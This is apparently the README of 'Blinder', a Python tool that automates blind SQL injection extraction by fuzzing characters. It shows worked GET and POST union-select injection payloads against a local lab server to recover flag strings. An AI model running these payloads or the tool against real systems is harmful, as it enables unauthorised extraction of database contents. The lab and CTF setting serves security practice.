# Blinder

Have you found a blind SQL injection? Great! Now you need to export it, but are you too lazy to sort through the values? Most likely, Blinder will help you!

Blinder is a tool that iterates through the values by letter. FUZZ is used to indicate the location of the search.

 ```
                       [HELP PAGE]
Usage: python3 blinder.py -u [URL] -v [GET/URL] -p [PARAMETERS]

Flags: 

[-h] [--help]: help page.
[--url] [-u]: url to target.
[-v] [--verbs]: HTTP verb (GET, POST, PUT and etc...).
[-p] [--parameters]: parameters for the target.
[-sl] [--show_length]: show response length.
[-il] [--incorrect_length]: size of incorrect length (for the filtration).
[-ec] [--exclude_characters]: Exclude characters from the fuzzing list. Specify sequentially in a line
    By default: [',&,%]
[-hg] [--hide-greeting]: Hide greeting.
[-ta] [--to-ascii]: Convert characters to ascii code.
[-ap] [--add-percent]: Add a percent sign to the end of FUZZ.
    In this mode, other characters can be added to the end of the line. These signs may be incorrect, due to the percentage.
[-tl] [--to-lower]: Convert letters to lowercase
[--hack]: Specify the URL of the target after the --hack flag, and it will be hacked.
```

## GET request

Let's specify the URL through the flag `[-u]`, and the verb through `[-v]`. Our request will look like this: . To make it work fine, add a percentage to the end of the line using the `[-ap]` flag. We want to see the length of the request. Let's add the `[-sl]` flag.

```bash
./blinder.py -u "http://192.168.0.100:7777/index.php?id=' union select id,name from users where name like 'FUZZ' -- -", -v GET  
-sl -ap
```

The end of result will be as follows:

![Pasted image 20211114160122](https://user-images.githubusercontent.com/70373439/141677868-562982a6-5753-4569-8980-5ee46ee73ea2.png)


We realized that the length `117` can be specified as incorrect. The letters will be converted to lowercase using the `[-tl]` flag, because we found upper and lower case letters. Specify the first letter `m`. In order for Blinder to fuzz recursively, we need to specify the wrong length 117 through `[-ic]` and remove the `[-sl]` flag.

```bash
/blinder.py -u "http://192.168.0.100:7777/index.php?id=' union select id,name from users where name like 'mFUZZ' -- -", -v GET -ap -il 117 -tl
```

![Pasted image 20211114160854](https://user-images.githubusercontent.com/70373439/141677834-24af56d5-65c2-4d32-a04f-83069ce572b1.png)


Let's connect the letter `m` and the result of Blinder:

`my_first_flag`

## POST request

In a post request, parameters are not passed through ?. There is a `[-p]` flag in Blinder for this request. We will specify the parameters using the `[-p]` flag. The rest of the flags, as in the get request.

```sql
./blinder.py -u "http://192.168.0.100:7777/index_post.php" -v POST -p "id=100' union select id,name from users where name like 'FUZZ' -- -" -sl -ap
```

The end of result will be as follows:

![Pasted image 20211114162703](https://user-images.githubusercontent.com/70373439/141677783-be290444-436c-4a00-a700-23bcaa74499b.png)

We realized that the length `184` can be specified as incorrect. The letters will be converted to lowercase using the `[-tl]` flag, because we found upper and lower case letters. Specify the first letter `f`. In order for Blinder to fuzz recursively, we need to specify the wrong length 184 through `[-ic]` and remove the `[-sl]` flag.

```bash
./blinder.py -u "http://192.168.0.100:7777/index_post.php" -v POST -p "id=100' union select id,name from users where name like 'fFUZZ' -- -" -il 184 -ap -tl
```


![Pasted image 20211114163021](https://user-images.githubusercontent.com/70373439/141677881-417a7dd1-4475-4352-9d9c-9705652aa96d.png)


Let's connect the letter `f` and the result of Blinder:

`flag`
